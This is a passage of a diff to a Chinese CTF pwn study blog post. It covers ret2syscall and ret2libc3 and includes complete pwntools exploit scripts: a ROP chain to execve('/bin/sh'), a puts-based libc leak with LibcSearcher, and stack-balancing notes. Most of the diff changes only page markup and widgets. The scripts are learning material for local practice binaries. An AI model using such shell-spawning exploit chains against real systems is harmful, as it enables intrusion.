 <h4 id="脚本-5"><a href="#脚本-5" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2syscall&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x080488ED&quot;)</span><br><span class="line">binsh=0x080ea068</span><br><span class="line">int_0x80=0x0806ce55</span><br><span class="line">pop_eax_ret = 0x080b8526</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806f200</span><br><span class="line"></span><br><span class="line">eax = 11 # #define __NR_ execve 11</span><br><span class="line">ebx = binsh</span><br><span class="line">ecx = 0</span><br><span class="line">edx = 0</span><br><span class="line">payload=b&#x27;a&#x27;*(0x108+4)</span><br><span class="line">payload+=p32(pop_eax_ret)+p32(eax)</span><br><span class="line">payload+=p32(pop_edx_ecx_ebx_ret)+p32(edx)+p32(ecx)+p32(ebx)</span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h3 id="函数调用和系统调用"><a href="#函数调用和系统调用" class="headerlink" title="函数调用和系统调用"></a>函数调用和系统调用</h3><table>
@@ -558,7 +725,12 @@
 <p><strong>EDI、EBP</strong>这6个寄存器。</p>
 <p>在64位系统中，使用<strong>syscall</strong>指令来触发系统调用，同样使用<strong>EAX（RAX）寄存器传递系统调用号</strong>，<strong>RDI、RSI、RDX、RCX、R8、R9</strong></p>
 <p>这6个寄存器用来传递参数。</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172325495.png"  alt="image-20250711172325495"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172325495.png"
+                        alt="image-20250711172325495"
+                 ></p>
 <p>eg:<code>read（0,buf,0x100）</code></p>
 <p>32位时，eax&#x3D;3（#define__NR_read 3）;ebx&#x3D;0;ecx&#x3D;buf;edx&#x3D;0x100;，设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的read（0,buf,0x100）。实际上，最后还会进入内核态执行。</p>
 <p>64位时，rax&#x3D;0（#define__NR_read 0）;rdi&#x3D;0;rsi&#x3D;buf;rdx&#x3D;0x100，设置完每个寄存器的值之后，再执行syscall指令，就会执行对应的read（0,buf,0x100）。</p>
@@ -566,10 +738,20 @@
 <p>如果想要完成<code>Get shell</code></p>
 <p>32位时，：eax&#x3D;11（#define__NR_execve 11）;ebx&#x3D;”&#x2F;bin&#x2F;sh”;ecx&#x3D;0;edx&#x3D;0;（NULL实际上就是0），设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的execve（”&#x2F;bin&#x2F;sh”,NULL,NULL）。</p>
 <p>64位时，rax&#x3D;59（#define__NR_execve 59）;rdi&#x3D;”&#x2F;bin&#x2F;sh”;rsi&#x3D;0;rdx&#x3D;0;</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172348689.png"  alt="image-20250711172348689"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172348689.png"
+                        alt="image-20250711172348689"
+                 ></p>
 <p>在ida中红色为外部函数，白色为内部函数</p>
 <p>静态编译的二进制文件全为内部函数</p>
-<h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250725092324043.png"  alt="image-20250725092324043"></p>
+<h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250725092324043.png"
+                        alt="image-20250725092324043"
+                 ></p>
 <h4 id="脚本-6"><a href="#脚本-6" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc3&quot;)</span><br><span class="line">#gdb.attach(p, &quot;b *0x0804854C&quot;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./ret2libc3&quot;)</span><br><span class="line"></span><br><span class="line">gets_got = elf.got[&quot;gets&quot;]</span><br><span class="line">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class="line">main_addr = 0x0804854E</span><br><span class="line"></span><br><span class="line"># 泄露 gets 地址</span><br><span class="line">p.recvuntil(&quot;ret2libc3\n&quot;)</span><br><span class="line">payload1  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;</span><br><span class="line">payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"># 获取泄露地址</span><br><span class="line">leak_addr = u32(p.recv(4))</span><br><span class="line"></span><br><span class="line"># 用 LibcSearcher 查</span><br><span class="line">libc = LibcSearcher(&quot;gets&quot;, leak_addr)#LibcSearcher 会根据你提供的函数名和地址，去匹配已知的 libc 数据库</span><br><span class="line">libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.dump(&quot;gets&quot;)是gets 函数在 libc 中的偏移（相对于 libc 基地址）</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr  = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">log.success(&quot;libc_base: &quot; + hex(libc_base))</span><br><span class="line">log.success(&quot;system: &quot; + hex(system_addr))</span><br><span class="line">log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))#输出这个计算出的地址，便于检查</span><br><span class="line"></span><br><span class="line"># 第二次攻击</span><br><span class="line">p.recvuntil(&quot;ret2libc3\n&quot;)</span><br><span class="line">payload2  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;</span><br><span class="line">payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
@@ -585,7 +767,12 @@
 </ul>
 <p>这些名字不是随便写的，是预先在 libc 数据库中定义好的符号名称。</p>
 <p>脚本执行后会显示</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250715113729689.png"  alt="image-20250715113729689"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250715113729689.png"
+                        alt="image-20250715113729689"
+                 ></p>
 <p>这是因为用libc &#x3D; LibcSearcher(“gets”, leak_addr)进行选择适合的libc库，但不同版本的libc.so文件的变化不大，一个函数的地址约束不够严格，所以会显示多个libc版本供选择</p>
 <h4 id="解决多个libc-so版本供选择"><a href="#解决多个libc-so版本供选择" class="headerlink" title="解决多个libc.so版本供选择"></a>解决多个libc.so版本供选择</h4><p>1.多个约束条件</p>
 <p><strong>哪些符号最稳妥</strong></p>
@@ -728,10 +915,20 @@
 <p><strong>✅ 二、动态调试：使用 GDB 查看 <code>rsp</code> 的值</strong></p>
 <p>对于这一题来说，在确定了libc.so库和libc基址之后，在system函数内在system处设置断点</p>
 <p>之后运行这个脚本</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250716102357535.png"  alt="image-20250716102357535"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250716102357535.png"
+                        alt="image-20250716102357535"
+                 ></p>
 <p>这里就选择好libc版本了</p>
 <p>之后动态调试查看</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250717160428491.png"  alt="image-20250717160428491"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250717160428491.png"
+                        alt="image-20250717160428491"
+                 ></p>
 <p>在刚进入这个函数的第一步，就已经处于不平衡的状态了</p>
 <p>因为它在调用前是栈平衡，调用时会有push rsp 指令改变</p>
 <p>查看栈顶的命令是</p>
@@ -806,7 +1003,12 @@
 <p><code>ljust(length, fillchar)</code> 会将当前的字节串 <code>leak</code> <strong>左对齐</strong>到指定的 <code>length</code>（这里是 8 字节），并使用 <code>fillchar</code>（这里是 <code>b&#39;\x00&#39;</code>，即空字节）从<strong>右侧</strong>进行填充。</p>
 <h3 id="查看调用函数的传递的参数"><a href="#查看调用函数的传递的参数" class="headerlink" title="查看调用函数的传递的参数"></a><strong>查看调用函数的传递的参数</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*(0x48+4)+p32(sys)+p32(main_addr)+p32(sh_addr)</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250718122316108.png"  alt="image-20250718122316108"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250718122316108.png"
+                        alt="image-20250718122316108"
+                 ></p>
 <p><strong>1. 初始状态（执行 <code>ret</code> 前）</strong></p>
 <p>假设此时栈布局如下（根据你的 payload）：</p>
 <p>python</p>
@@ -973,8 +1175,44 @@
                     </div>
                     <div>
                         
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
                     </div>
                 </div>
+
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/zfb.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="/images/tea.svg"></i>&nbsp;请作者喝杯咖啡
+    </div>
+</div>
 
                 
 
@@ -1165,6 +1403,19 @@
     
 
     
+        <div class="count-info info-item">
+            
+
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
 
     
 </footer>
@@ -1267,6 +1518,35 @@
 
     <!-- local search -->
     
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
 
     <!-- tablet toc -->
     
@@ -1306,8 +1586,16 @@
 
 <!-- local search -->
 
+    
+<script src="/js/local-search.js"></script>
+
+
 
 <!-- lazyload -->
+
+    
+<script src="/js/lazyload.js"></script>
+
 
 
 <div class="">
@@ -1332,6 +1620,10 @@
         
 
         <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
         
     
 
